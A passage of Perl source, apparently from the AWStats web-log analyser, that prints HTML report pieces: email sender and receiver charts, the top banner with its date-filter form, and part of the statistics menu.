        = ( shift, shift, shift, shift, shift, shift, shift, shift );
    $categicon = '';    # Comment this to enabme category icons
    my ( $menu, $menulink, $menutext ) = ( shift, shift, shift );
    my $linetitle = 0;

    # Call to plugins' function AddHTMLMenuLink
    foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuLink'} } ) {

        # my $function="AddHTMLMenuLink_$pluginname('$categ',\$menu,\$menulink,\$menutext)";
        # eval("$function");
        my $function = "AddHTMLMenuLink_$pluginname";
        &$function( $categ, $menu, $menulink, $menutext );
    }
    foreach my $key (%$menu) {
        if ( $menu->{$key} && $menu->{$key} > 0 ) { $linetitle++; last; }
    }
    if ( !$linetitle ) { return; }

    # At least one entry in menu for this category, we can show category and entries
    my $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );
    print "<tr><td class=\"awsm\" width=\"$WIDTHMENU1\""
        . ( $frame ? "" : " valign=\"top\"" ) . ">"
        . ( $categicon ? "<img src=\"$DirIcons/other/$categicon\" />&nbsp;" : "" )
        . "<b>$categtext:</b></td>\n";
    print( $frame? "</tr>\n" : "<td class=\"awsm\">" );
    foreach my $key ( sort { $menu->{$a} <=> $menu->{$b} } keys %$menu ) {
        if ( $menu->{$key} == 0 )     { next; }
        if ( $menulink->{$key} == 1 ) {
            print( $frame? "<tr><td class=\"awsm\">" : "" );
            print
                "<a href=\"$linkanchor#$key\"$targetpage>$menutext->{$key}</a>";
            print( $frame? "</td></tr>\n" : " &nbsp; " );
        }
        if ( $menulink->{$key} == 2 ) {
            print( $frame
                ? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
                : ""
            );
            print "<a href=\""
                . (
                $ENV{'GATEWAY_INTERFACE'}
                    || !$StaticLinks
                    ? XMLEncode("$AWScript${NewLinkParams}output=$key")
                    : "$StaticLinks.$key.$StaticExt"
            )
                . "\"$NewLinkTarget>$menutext->{$key}</a>\n";
            print( $frame? "</td></tr>\n" : " &nbsp; " );
        }
    }
    print( $frame? "" : "</td></tr>\n" );
}

#------------------------------------------------------------------------------
# Function:     Prints HTML to display an email senders chart
# Parameters:   -
# Input:        $NewLinkParams, NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowEmailSendersChart {
    my $NewLinkParams         = shift;
    my $NewLinkTarget         = shift;
    my $MaxLengthOfShownEMail = 48;

    my $total_p;
    my $total_h;
    my $total_k;
    my $max_p;
    my $max_h;
    my $max_k;
    my $rest_p;
    my $rest_h;
    my $rest_k;

    # Show filter form
    #&ShowFormFilter("emailsfilter",$EmailsFilter);
    # Show emails list

    print "$Center<a name=\"emailsenders\">&nbsp;</a><br />\n";
    my $title;
    if ( $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} ) {
        $title = "$Message[131]";
    }
    else {
        $title =
            "$Message[131] ($Message[77] $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\""
                . (
                $ENV{'GATEWAY_INTERFACE'}
                    || !$StaticLinks
                    ? XMLEncode("$AWScript${NewLinkParams}output=allemails")
                    : "$StaticLinks.allemails.$StaticExt"
            )
                . "\"$NewLinkTarget>$Message[80]</a>";
        if ( $ShowEMailSenders =~ /L/i ) {
            $title .= " &nbsp; - &nbsp; <a href=\""
                . (
                $ENV{'GATEWAY_INTERFACE'}
                    || !$StaticLinks
                    ? XMLEncode("$AWScript${NewLinkParams}output=lastemails")
                    : "$StaticLinks.lastemails.$StaticExt"
            )
                . "\"$NewLinkTarget>$Message[9]</a>";
        }
    }
    &tab_head( "$title", 19, 0, 'emailsenders' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"3\">$Message[131] : "
            . ( scalar keys %_emails_h ) . "</th>";
    if ( $ShowEMailSenders =~ /H/i ) {
        print "<th rowspan=\"2\" bgcolor=\"#$color_h\" width=\"80\""
            . Tooltip(4)
            . ">$Message[57]</th>";
    }
    if ( $ShowEMailSenders =~ /B/i ) {
        print
            "<th class=\"datasize\" rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\""
                . Tooltip(5)
                . ">$Message[75]</th>";
    }
    if ( $ShowEMailSenders =~ /M/i ) {
        print
            "<th rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\">$Message[106]</th>";
    }
    if ( $ShowEMailSenders =~ /L/i ) {
        print "<th rowspan=\"2\" width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"30%\">Local</th><th>&nbsp;</th><th width=\"30%\">External</th></tr>";
    $total_p = $total_h = $total_k = 0;
    $max_h = 1;
    foreach ( values %_emails_h ) {
        if ( $_ > $max_h ) { $max_h = $_; }
    }
    $max_k = 1;
    foreach ( values %_emails_k ) {
        if ( $_ > $max_k ) { $max_k = $_; }
    }
    my $count = 0;
    if ( !$HTMLOutput{'allemails'} && !$HTMLOutput{'lastemails'} ) {
        &BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emails_h,
            \%_emails_h );
    }
    if ( $HTMLOutput{'allemails'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emails_h,
            \%_emails_h );
    }
    if ( $HTMLOutput{'lastemails'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emails_h,
            \%_emails_l );
    }
    foreach my $key (@keylist) {
        my $newkey = $key;
        if ( length($key) > $MaxLengthOfShownEMail ) {
            $newkey = substr( $key, 0, $MaxLengthOfShownEMail ) . "...";
        }
        my $bredde_h = 0;
        my $bredde_k = 0;
        if ( $max_h > 0 ) {
            $bredde_h = int( $BarWidth * $_emails_h{$key} / $max_h ) + 1;
        }
        if ( $max_k > 0 ) {
            $bredde_k = int( $BarWidth * $_emails_k{$key} / $max_k ) + 1;
        }
        print "<tr>";
        my $direction = IsLocalEMail($key);

        if ( $direction > 0 ) {
            print "<td class=\"aws\">$newkey</td><td>-&gt;</td><td>&nbsp;</td>";
        }
        if ( $direction == 0 ) {
            print
                "<td colspan=\"3\"><span style=\"color: #$color_other\">$newkey</span></td>";
        }
        if ( $direction < 0 ) {
            print "<td class=\"aws\">&nbsp;</td><td>&lt;-</td><td>$newkey</td>";
        }
        if ( $ShowEMailSenders =~ /H/i ) { print "<td>$_emails_h{$key}</td>"; }
        if ( $ShowEMailSenders =~ /B/i ) {
            print "<td nowrap=\"nowrap\">"
                . Format_Bytes( $_emails_k{$key} ) . "</td>";
        }
        if ( $ShowEMailSenders =~ /M/i ) {
            print "<td nowrap=\"nowrap\">"
                . Format_Bytes( $_emails_k{$key} / ( $_emails_h{$key} || 1 ) )
                . "</td>";
        }
        if ( $ShowEMailSenders =~ /L/i ) {
            print "<td nowrap=\"nowrap\">"
                . ( $_emails_l{$key} ? Format_Date( $_emails_l{$key}, 1 ) : '-' )
                . "</td>";
        }
        print "</tr>\n";

        #$total_p += $_emails_p{$key};
        $total_h += $_emails_h{$key};
        $total_k += $_emails_k{$key};
        $count++;
    }
    $rest_p = 0;                        # $rest_p=$TotalPages-$total_p;
    $rest_h = $TotalHits - $total_h;
    $rest_k = $TotalBytes - $total_k;
    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 ) { # All other sender emails
        print
            "<tr><td colspan=\"3\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        if ( $ShowEMailSenders =~ /H/i ) { print "<td>$rest_h</td>"; }
        if ( $ShowEMailSenders =~ /B/i ) {
            print "<td nowrap=\"nowrap\">" . Format_Bytes($rest_k) . "</td>";
        }
        if ( $ShowEMailSenders =~ /M/i ) {
            print "<td nowrap=\"nowrap\">"
                . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . "</td>";
        }
        if ( $ShowEMailSenders =~ /L/i ) { print "<td>&nbsp;</td>"; }
        print "</tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints HTML to display an email receivers chart
# Parameters:   -
# Input:        $NewLinkParams, NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowEmailReceiversChart {
    my $NewLinkParams         = shift;
    my $NewLinkTarget         = shift;
    my $MaxLengthOfShownEMail = 48;

    my $total_p;
    my $total_h;
    my $total_k;
    my $max_p;
    my $max_h;
    my $max_k;
    my $rest_p;
    my $rest_h;
    my $rest_k;

    # Show filter form
    #&ShowFormFilter("emailrfilter",$EmailrFilter);
    # Show emails list

    print "$Center<a name=\"emailreceivers\">&nbsp;</a><br />\n";
    my $title;
    if ( $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} ) {
        $title = "$Message[132]";
    }
    else {
        $title =
            "$Message[132] ($Message[77] $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\""
                . (
                $ENV{'GATEWAY_INTERFACE'}
                    || !$StaticLinks
                    ? XMLEncode("$AWScript${NewLinkParams}output=allemailr")
                    : "$StaticLinks.allemailr.$StaticExt"
            )
                . "\"$NewLinkTarget>$Message[80]</a>";
        if ( $ShowEMailReceivers =~ /L/i ) {
            $title .= " &nbsp; - &nbsp; <a href=\""
                . (
                $ENV{'GATEWAY_INTERFACE'}
                    || !$StaticLinks
                    ? XMLEncode("$AWScript${NewLinkParams}output=lastemailr")
                    : "$StaticLinks.lastemailr.$StaticExt"
            )
                . "\"$NewLinkTarget>$Message[9]</a>";
        }
    }
    &tab_head( "$title", 19, 0, 'emailreceivers' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"3\">$Message[132] : "
            . ( scalar keys %_emailr_h ) . "</th>";
    if ( $ShowEMailReceivers =~ /H/i ) {
        print "<th rowspan=\"2\" bgcolor=\"#$color_h\" width=\"80\""
            . Tooltip(4)
            . ">$Message[57]</th>";
    }
    if ( $ShowEMailReceivers =~ /B/i ) {
        print
            "<th class=\"datasize\" rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\""
                . Tooltip(5)
                . ">$Message[75]</th>";
    }
    if ( $ShowEMailReceivers =~ /M/i ) {
        print
            "<th rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\">$Message[106]</th>";
    }
    if ( $ShowEMailReceivers =~ /L/i ) {
        print "<th rowspan=\"2\" width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"30%\">Local</th><th>&nbsp;</th><th width=\"30%\">External</th></tr>";
    $total_p = $total_h = $total_k = 0;
    $max_h = 1;
    foreach ( values %_emailr_h ) {
        if ( $_ > $max_h ) { $max_h = $_; }
    }
    $max_k = 1;
    foreach ( values %_emailr_k ) {
        if ( $_ > $max_k ) { $max_k = $_; }
    }
    my $count = 0;
    if ( !$HTMLOutput{'allemailr'} && !$HTMLOutput{'lastemailr'} ) {
        &BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emailr_h,
            \%_emailr_h );
    }
    if ( $HTMLOutput{'allemailr'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emailr_h,
            \%_emailr_h );
    }
    if ( $HTMLOutput{'lastemailr'} ) {
        &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emailr_h,
            \%_emailr_l );
    }
    foreach my $key (@keylist) {
        my $newkey = $key;
        if ( length($key) > $MaxLengthOfShownEMail ) {
            $newkey = substr( $key, 0, $MaxLengthOfShownEMail ) . "...";
        }
        my $bredde_h = 0;
        my $bredde_k = 0;
        if ( $max_h > 0 ) {
            $bredde_h = int( $BarWidth * $_emailr_h{$key} / $max_h ) + 1;
        }
        if ( $max_k > 0 ) {
            $bredde_k = int( $BarWidth * $_emailr_k{$key} / $max_k ) + 1;
        }
        print "<tr>";
        my $direction = IsLocalEMail($key);

        if ( $direction > 0 ) {
            print "<td class=\"aws\">$newkey</td><td>&lt;-</td><td>&nbsp;</td>";
        }
        if ( $direction == 0 ) {
            print
                "<td colspan=\"3\"><span style=\"color: #$color_other\">$newkey</span></td>";
        }
        if ( $direction < 0 ) {
            print "<td class=\"aws\">&nbsp;</td><td>-&gt;</td><td>$newkey</td>";
        }
        if ( $ShowEMailReceivers =~ /H/i ) {
            print "<td>$_emailr_h{$key}</td>";
        }
        if ( $ShowEMailReceivers =~ /B/i ) {
            print "<td nowrap=\"nowrap\">"
                . Format_Bytes( $_emailr_k{$key} ) . "</td>";
        }
        if ( $ShowEMailReceivers =~ /M/i ) {
            print "<td nowrap=\"nowrap\">"
                . Format_Bytes( $_emailr_k{$key} / ( $_emailr_h{$key} || 1 ) )
                . "</td>";
        }
        if ( $ShowEMailReceivers =~ /L/i ) {
            print "<td nowrap=\"nowrap\">"
                . ( $_emailr_l{$key} ? Format_Date( $_emailr_l{$key}, 1 ) : '-' )
                . "</td>";
        }
        print "</tr>\n";

        #$total_p += $_emailr_p{$key};
        $total_h += $_emailr_h{$key};
        $total_k += $_emailr_k{$key};
        $count++;
    }
    $rest_p = 0;                        # $rest_p=$TotalPages-$total_p;
    $rest_h = $TotalHits - $total_h;
    $rest_k = $TotalBytes - $total_k;
    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )
    {                                   # All other receiver emails
        print
            "<tr><td colspan=\"3\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        if ( $ShowEMailReceivers =~ /H/i ) { print "<td>$rest_h</td>"; }
        if ( $ShowEMailReceivers =~ /B/i ) {
            print "<td nowrap=\"nowrap\">" . Format_Bytes($rest_k) . "</td>";
        }
        if ( $ShowEMailReceivers =~ /M/i ) {
            print "<td nowrap=\"nowrap\">"
                . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . "</td>";
        }
        if ( $ShowEMailReceivers =~ /L/i ) { print "<td>&nbsp;</td>"; }
        print "</tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the top banner of the inner frame or static page
# Parameters:   $WIDTHMENU1
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLTopBanner{
    my $WIDTHMENU1 = shift;
    my $frame = ( $FrameName eq 'mainleft' );

    if ($Debug) { debug( "ShowTopBan", 2 ); }
    print "$Center<a name=\"menu\">&nbsp;</a>\n";

    if ( $FrameName ne 'mainleft' ) {
        my $NewLinkParams = ${QueryString};
        $NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
        $NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
        $NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;
        $NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;
        $NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
        $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
        $NewLinkParams =~ s/^&amp;//;
        $NewLinkParams =~ s/&amp;$//;
        my $NewLinkTarget = '';

        if ( $FrameName eq 'mainright' ) {
            $NewLinkTarget = " target=\"_parent\"";
        }
        print "<form name=\"FormDateFilter\" action=\""
            . XMLEncode("$AWScript${NewLinkParams}")
            . "\" style=\"padding: 0px 0px 20px 0px; margin-top: 0\"$NewLinkTarget>\n";
    }

    if ( $QueryString !~ /buildpdf/i ) {
        print
            "<table class=\"aws_border\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";
        print "<tr><td>\n";
        print
            "<table class=\"aws_data sortable\" border=\"0\" cellpadding=\"1\" cellspacing=\"0\" width=\"100%\">\n";
    }
    else {
        print "<table width=\"100%\">\n";
    }

    if ( $FrameName ne 'mainright' ) {

        # Print Statistics Of
        if ( $FrameName eq 'mainleft' ) {
            my $shortSiteDomain = $SiteDomain;
            if ( length($SiteDomain) > 30 ) {
                $shortSiteDomain =
                    substr( $SiteDomain, 0, 20 ) . "..."
                        . substr( $SiteDomain, length($SiteDomain) - 5, 5 );
            }
            print
                "<tr><td class=\"awsm\"><b>$Message[7]:</b></td></tr><tr><td class=\"aws\"><span style=\"font-size: 12px;\">$shortSiteDomain</span></td>";
        }
        else {
            print
                "<tr><td class=\"aws\" valign=\"middle\"><b>$Message[7]:</b>&nbsp;</td><td class=\"aws\" valign=\"middle\"><span style=\"font-size: 14px;\">$SiteDomain</span></td>";
        }

        # Logo and flags
        if ( $FrameName ne 'mainleft' ) {
            if ( $LogoLink =~ "https://www.awstats.org" ) {
                print "<td align=\"right\" rowspan=\"3\"><a href=\""
                    . XMLEncode($LogoLink)
                    . "\" target=\"awstatshome\"><img src=\"$DirIcons/other/$Logo\" border=\"0\""
                    . AltTitle( ucfirst($PROG) . " Web Site" )
                    . " /></a>";
            }
            else {
                print "<td align=\"right\" rowspan=\"3\"><a href=\""
                    . XMLEncode($LogoLink)
                    . "\" target=\"awstatshome\"><img src=\"$DirIcons/other/$Logo\" border=\"0\" /></a>";
            }
            if ( !$StaticLinks ) { print "<br />"; Show_Flag_Links($Lang); }
            print "</td>";
        }
        print "</tr>\n";
    }
    if ( $FrameName ne 'mainleft' ) {

        # Print Last Update
        print
            "<tr valign=\"middle\"><td class=\"aws\" valign=\"middle\" width=\"$WIDTHMENU1\"><b>$Message[35]:</b>&nbsp;</td>";
        print
            "<td class=\"aws\" valign=\"middle\"><span style=\"font-size: 12px;\">";
        if ($LastUpdate) { print Format_Date( $LastUpdate, 0 ); }
        else {

            # Here NbOfOldLines = 0 (because LastUpdate is not defined)
            if ( !$UpdateStats ) {
                print "<span style=\"color: #880000\">$Message[24]</span>";
            }
            else {
                print
                    "<span style=\"color: #880000\">No qualified records found in log
 ($NbOfLinesCorrupted corrupted, $NbOfLinesComment comments, $NbOfLinesBlank Blank,
 $NbOfLinesDropped dropped)</span>";
            }
        }
        print "</span>";

        # Print Update Now link
        if ( $AllowToUpdateStatsFromBrowser && !$StaticLinks ) {
            my $NewLinkParams = ${QueryString};
            $NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
            $NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
            $NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
            if ( $FrameName eq 'mainright' ) {
                $NewLinkParams .= "&amp;framename=mainright";
            }
            $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
            $NewLinkParams =~ s/^&amp;//;
            $NewLinkParams =~ s/&amp;$//;
            if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
            print "&nbsp; &nbsp; &nbsp; &nbsp;";
            print "<a href=\""
                . XMLEncode("$AWScript${NewLinkParams}update=1")
                . "\">$Message[74]</a>";
        }
        print "</td>";

        # Logo and flags
        if ( $FrameName eq 'mainright' ) {
            if ( $LogoLink =~ "https://www.awstats.org" ) {
                print "<td align=\"right\" rowspan=\"2\"><a href=\""
                    . XMLEncode($LogoLink)
                    . "\" target=\"awstatshome\"><img src=\"$DirIcons/other/$Logo\" border=\"0\""
                    . AltTitle( ucfirst($PROG) . " Web Site" )
                    . " /></a>\n";
            }
            else {
                print "<td align=\"right\" rowspan=\"2\"><a href=\""
                    . XMLEncode($LogoLink)
                    . "\" target=\"awstatshome\"><img src=\"$DirIcons/other/$Logo\" border=\"0\" /></a>\n";
            }
            if ( !$StaticLinks ) { print "<br />"; Show_Flag_Links($Lang); }
            print "</td>";
        }

        print "</tr>\n";

        # Print selected period of analysis (month and year required)
        print
            "<tr><td class=\"aws\" valign=\"middle\"><b>$Message[133]:</b></td>";
        print "<td class=\"aws\" valign=\"middle\">";
        if ( $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks ) {
            print "<select class=\"aws_formfield\" name=\"databasebreak\">\n";
            print "<option"
                . ( $DatabaseBreak eq "month" ? " selected=\"selected\"" : "" )
                . " value=\"month\">$Message[5]</option>\n";
            print "<option"
                . ( $DatabaseBreak eq "day" ? " selected=\"selected\"" : "" )
                . " value=\"day\">$Message[4]</option>\n";
            print "<option"
                . ( $DatabaseBreak eq "hour" ? " selected=\"selected\"" : "" )
                . " value=\"hour\">$Message[187]</option>\n";
            print "</select>\n";

            print "<select class=\"aws_formfield\" name=\"month\">\n";
            foreach ( 1 .. 12 ) {
                my $monthix = sprintf( "%02s", $_ );
                print "<option"
                    . (
                    "$MonthRequired" eq "$monthix"
                        ? " selected=\"selected\""
                        : ""
                )
                    . " value=\"$monthix\">$MonthNumLib{$monthix}</option>\n";
            }
            if ( $AllowFullYearView >= 2 ) {
                print "<option"
                    . ( $MonthRequired eq 'all' ? " selected=\"selected\"" : "" )
                    . " value=\"all\">- $Message[6] -</option>\n";
            }
            print "</select>\n";
            print "<select class=\"aws_formfield\" name=\"year\">\n";

            # Add YearRequired in list if not in ListOfYears
            $ListOfYears{$YearRequired} ||= $MonthRequired;
            foreach ( sort keys %ListOfYears ) {
                print "<option"
                    . ( $YearRequired eq "$_" ? " selected=\"selected\"" : "" )
                    . " value=\"$_\">$_</option>\n";
            }
            print "</select>\n";

            if (	$DatabaseBreak eq 'day' ||
                $DatabaseBreak eq 'hour') {
                if (!$DayRequired) {
                    $DayRequired = $nowday;
                }
                print "<select class=\"aws_formfield\" name=\"day\">\n";
                foreach ( 1 .. 31 ) {
                    print "<option"
                        . ( $DayRequired eq "$_" ? " selected=\"selected\"" : "" )
                        . " value=\"$_\">$_</option>\n";
                }
                print "</select>\n";
            }

            if (	$DatabaseBreak eq 'hour') {
                if (!$HourRequired) {
                    $HourRequired = $nowhour;
                }
                print "<select class=\"aws_formfield\" name=\"hour\">\n";
                foreach ( 0 .. 23 ) {
                    print "<option"
                        . ( $HourRequired eq "$_" ? " selected=\"selected\"" : "" )
                        . " value=\"$_\">$_</option>\n";
                }
                print "</select>\n";
            }

            print "<input type=\"hidden\" name=\"output\" value=\""
                . join( ',', keys %HTMLOutput )
                . "\" />\n";
            if ($SiteConfig) {
                print
                    "<input type=\"hidden\" name=\"config\" value=\"$SiteConfig\" />\n";
            }
            if ($DirConfig) {
                print
                    "<input type=\"hidden\" name=\"configdir\" value=\"$DirConfig\" />\n";
            }
            if ( $QueryString =~ /lang=(\w+)/i ) {
                print
                    "<input type=\"hidden\" name=\"lang\" value=\"$1\" />\n";
            }
            if ( $QueryString =~ /debug=(\d+)/i ) {
                print
                    "<input type=\"hidden\" name=\"debug\" value=\"$1\" />\n";
            }
            if ( $FrameName eq 'mainright' ) {
                print
                    "<input type=\"hidden\" name=\"framename\" value=\"index\" />\n";
            }
            print
                "<input type=\"submit\" value=\" $Message[115] \" class=\"aws_button\" />";
        }
        else {
            print "<span style=\"font-size: 14px;\">";
            if ($DayRequired) { print "$Message[4] $DayRequired - "; }
            if ( $MonthRequired eq 'all' ) {
                print "$Message[6] $YearRequired";
            }
            else {
                print
                    "$Message[5] $MonthNumLib{$MonthRequired} $YearRequired";
            }
            print "</span>";
        }
        print "</td></tr>\n";
    }
    if ( $QueryString !~ /buildpdf/i ) {
        print "</table>\n";
        print "</td></tr></table>\n";
    }
    else {
        print "</table>\n";
    }

    if ( $FrameName ne 'mainleft' ) { print "</form><br />\n"; }
    else { print "<br />\n"; }
    print "\n";
}

#------------------------------------------------------------------------------
# Function:     Prints the menu in a frame or below the top banner
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMenu{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;
    my $frame = ( $FrameName eq 'mainleft' );

    if ($Debug) { debug( "ShowMenu", 2 ); }

    # Print menu links
    if ( ( $HTMLOutput{'main'} && $FrameName ne 'mainright' )
        || $FrameName eq 'mainleft' )
    {    # If main page asked
        # Define link anchor
        my $linkanchor =
            ( $FrameName eq 'mainleft' ? "$AWScript${NewLinkParams}" : "" );
        if ( $linkanchor && ( $linkanchor !~ /framename=mainright/ ) ) {
            $linkanchor .= "framename=mainright";
        }
        $linkanchor =~ s/(&|&amp;)$//;
        $linkanchor = XMLEncode("$linkanchor");

        # Define target
        my $targetpage =
            ( $FrameName eq 'mainleft' ? " target=\"mainright\"" : "" );

        # Print Menu
        my $linetitle;    # TODO a virer
        if ( !$PluginsLoaded{'ShowMenu'}{'menuapplet'} ) {
            my $menuicon = 0;    # TODO a virer
            # Menu HTML
            print "<table"
                . (
                $frame
                    ? " cellspacing=\"0\" cellpadding=\"0\" border=\"0\""
                    : ""
            )
                . ">\n";
            if ( $FrameName eq 'mainleft' && $ShowMonthStats ) {
                print( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#top\"$targetpage>$Message[128]</a>";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            my %menu     = ();
            my %menulink = ();
            my %menutext = ();

            # When
            %menu = (
                'month'       => $ShowMonthStats       ? 1 : 0,
                'daysofmonth' => $ShowDaysOfMonthStats ? 2 : 0,
                'daysofweek'  => $ShowDaysOfWeekStats  ? 3 : 0,
                'hours'       => $ShowHoursStats       ? 4 : 0
            );
            %menulink = (
                'month'       => 1,
                'daysofmonth' => 1,
                'daysofweek'  => 1,
                'hours'       => 1
            );
            %menutext = (
                'month'       => $Message[162],
                'daysofmonth' => $Message[138],
                'daysofweek'  => $Message[91],
                'hours'       => $Message[20]
            );
            HTMLShowMenuCateg(
                'when',         $Message[93],
                'menu4.png',    $frame,
                $targetpage,    $linkanchor,
                $NewLinkParams, $NewLinkTarget,
                \%menu,         \%menulink,
                \%menutext
            );

            # Who
            %menu = (
                'countries'  => $ShowDomainsStats ? 1 : 0,
                'alldomains' => $ShowDomainsStats ? 2 : 0,
                'visitors'   => $ShowHostsStats   ? 3 : 0,
                'allhosts'   => $ShowHostsStats   ? 4 : 0,
                'lasthosts' => ( $ShowHostsStats =~ /L/i ) ? 5 : 0,
                'unknownip' => $ShowHostsStats         ? 6 : 0,
                'logins'    => $ShowAuthenticatedUsers ? 7 : 0,
                'alllogins' => $ShowAuthenticatedUsers ? 8 : 0,
                'lastlogins' => ( $ShowAuthenticatedUsers =~ /L/i ) ? 9 : 0,
                'emailsenders' => $ShowEMailSenders ? 10 : 0,
                'allemails'    => $ShowEMailSenders ? 11 : 0,
                'lastemails' => ( $ShowEMailSenders =~ /L/i ) ? 12 : 0,
                'emailreceivers' => $ShowEMailReceivers ? 13 : 0,
                'allemailr'      => $ShowEMailReceivers ? 14 : 0,
                'lastemailr' => ( $ShowEMailReceivers =~ /L/i ) ? 15 : 0,
                'robots'    => $ShowRobotsStats ? 16 : 0,
                'allrobots' => $ShowRobotsStats ? 17 : 0,
                'lastrobots' => ( $ShowRobotsStats =~ /L/i ) ? 18 : 0,
                'worms' => $ShowWormsStats ? 19 : 0
            );
            %menulink = (
                'countries'      => 1,
                'alldomains'     => 2,
                'visitors'       => 1,
                'allhosts'       => 2,
                'lasthosts'      => 2,
                'unknownip'      => 2,
                'logins'         => 1,
                'alllogins'      => 2,
                'lastlogins'     => 2,
                'emailsenders'   => 1,
                'allemails'      => 2,
                'lastemails'     => 2,
                'emailreceivers' => 1,
                'allemailr'      => 2,
                'lastemailr'     => 2,
                'robots'         => 1,
                'allrobots'      => 2,
                'lastrobots'     => 2,
                'worms'          => 1
            );
            %menutext = (
                'countries'      => $Message[148],
                'alldomains'     => $Message[80],
                'visitors'       => $Message[81],
                'allhosts'       => $Message[80],
                'lasthosts'      => $Message[9],
                'unknownip'      => $Message[45],
                'logins'         => $Message[94],
                'alllogins'      => $Message[80],
                'lastlogins'     => $Message[9],
                'emailsenders'   => $Message[131],
                'allemails'      => $Message[80],
                'lastemails'     => $Message[9],
                'emailreceivers' => $Message[132],
                'allemailr'      => $Message[80],
                'lastemailr'     => $Message[9],
                'robots'         => $Message[53],
                'allrobots'      => $Message[80],
                'lastrobots'     => $Message[9],
                'worms'          => $Message[136]
            );
            HTMLShowMenuCateg(
                'who',          $Message[92],
                'menu5.png',    $frame,
                $targetpage,    $linkanchor,
                $NewLinkParams, $NewLinkTarget,
                \%menu,         \%menulink,
                \%menutext
            );

            # Navigation
            $linetitle = &AtLeastOneNotNull(
                $ShowSessionsStats,  $ShowPagesStats,
                $ShowFileTypesStats, $ShowFileSizesStats,
                $ShowOSStats,        $ShowBrowsersStats,
                $ShowScreenSizeStats, $ShowDownloadsStats
            );
            if ($linetitle) {
                print "<tr><td class=\"awsm\""
                    . ( $frame ? "" : " valign=\"top\"" ) . ">"
                    . (
                    $menuicon
                        ? "<img src=\"$DirIcons/other/menu2.png\" />&nbsp;"
                        : ""
                )
                    . "<b>$Message[72]:</b></td>\n";
            }
            if ($linetitle) {
                print( $frame? "</tr>\n" : "<td class=\"awsm\">" );
            }
            if ($ShowSessionsStats) {
                print( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#sessions\"$targetpage>$Message[117]</a>";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowFileSizesStats) {
                print ( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#filesizes\"$targetpage>$Message[186]</a>";
                print ( $frame? "</td></tr>\n" : " &nbsp; ");
            }
            if ($ShowRequestTimesStats) {
                print( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#requesttimes\"$targetpage>$Message[188]</a>";
                print ($frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowFileTypesStats && $LevelForFileTypesDetection > 0) {
                print( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#filetypes\"$targetpage>$Message[73]</a>";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowDownloadsStats && $LevelForFileTypesDetection > 0) {
                print( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#downloads\"$targetpage>$Message[178]</a>";
